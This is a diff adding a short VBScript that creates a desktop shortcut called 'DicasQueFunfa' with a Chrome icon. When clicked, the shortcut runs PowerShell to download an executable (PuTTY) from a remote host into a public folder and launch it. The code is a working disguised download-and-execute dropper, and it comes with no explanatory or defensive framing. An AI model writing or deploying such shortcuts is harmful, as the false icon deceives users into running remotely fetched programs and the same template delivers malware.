@@ -1,0 +1,9 @@
+Set objShell = CreateObject("WScript.Shell")
+strDesktop = objShell.SpecialFolders("Desktop")
+Set objLink = objShell.CreateShortcut(strDesktop & "\DicasQueFunfa.lnk")
+objLink.TargetPath = "C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"
+objLink.Arguments = "cmd /c powershell wGet 'https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe' -OutFile 'C:\Users\Public\putty.exe'; Start 'C:\Users\Public\putty.exe'"
+objLink.WorkingDirectory = "%HOMEDRIVE%%HOMEPATH%"
+objLink.IconLocation = "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe, 2"
+objLink.Description = "Dicas Que Funfa!"
+objLink.Save
